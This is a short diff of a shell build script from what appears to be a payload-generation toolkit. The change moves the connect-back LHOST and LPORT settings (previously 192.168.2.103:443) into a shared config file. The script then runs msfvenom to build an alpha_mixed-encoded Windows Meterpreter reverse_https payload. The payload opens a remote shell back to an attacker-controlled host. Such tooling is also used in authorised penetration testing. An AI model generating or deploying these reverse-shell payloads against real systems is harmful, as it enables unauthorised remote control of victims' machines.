@@ -6,9 +6,12 @@
 # or enter $win32_compiler="mycompiler" here
 . build/global_win32.sh
 
-# configure your connect-back settings here
-LHOST=192.168.2.103
-LPORT=443
+# import global default lhost and lport values from build/global_connect_config.sh
+. build/global_connect_config.sh
+
+# override connect-back settings here, if necessary
+LPORT=$GLOBAL_LPORT
+LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload, encoded with msf alpha_mixed 
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f raw > alpha_mixed.txt
